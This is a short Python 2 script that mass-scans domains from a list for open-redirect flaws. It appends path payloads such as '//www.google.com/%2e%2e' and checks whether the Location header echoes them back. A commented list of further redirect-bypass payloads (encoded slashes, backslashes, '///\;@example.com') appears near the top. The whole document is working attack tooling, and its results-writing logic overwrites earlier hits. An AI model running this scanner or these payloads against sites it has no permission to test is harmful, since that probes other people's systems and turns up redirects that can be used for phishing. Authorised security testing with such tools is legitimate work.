import requests
payload = "//www.google.com/%2e%2e"
#payload = ["//www.google.com/%2e%2e","/http://example.com","/%5cexample.com","/%2f%2fexample.com","/example.com/%2f%2e%2e","/http:/example.com","/.example.com","///\;@example.com","///example.com/","///example.com","///example.com/%2f..","/////example.com/","/////example.com"]
print payload;
with open("list.txt", "r") as f:
	for domain in f:
		domain = domain.strip()
		try:
			r = requests.get("http://" + domain + payload, allow_redirects=False)
			if "Location" in r.headers and r.headers["Location"] == payload:
				print domain + payload
				print "Got It!!"
				tulis = domain + payload
				f = open('Results.txt','w')
				f.write(tulis)
			else:
				print "--------------------------------------------"
				print "Domain: " + domain
				print "Location: " + r.headers["Location"]
				print "Status: " + str(r.status_code)
				print "URL+Payload: " + domain + payload
				print "--------------------------------------------"
		except:
			#print "Error: " + domain + " with " + str(r.status_code)
			pass
			
